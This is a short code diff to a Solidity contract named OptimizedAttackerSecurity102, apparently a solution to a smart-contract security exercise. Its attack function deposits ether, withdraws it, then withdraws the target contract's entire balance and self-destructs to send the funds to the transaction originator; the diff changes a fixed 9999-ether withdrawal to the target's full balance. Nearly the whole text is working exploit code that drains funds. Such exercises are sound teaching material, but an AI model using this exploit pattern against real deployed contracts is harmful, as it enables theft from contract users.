@@ -35,7 +35,7 @@ contract OptimizedAttackerSecurity102 {
     function attack(Target target) external payable {
         target.deposit{ value: msg.value }();
         target.withdraw(msg.value);
-        target.withdraw(9999 ether);
+        target.withdraw(address(target).balance);
         selfdestruct(payable(tx.origin));
     }
 
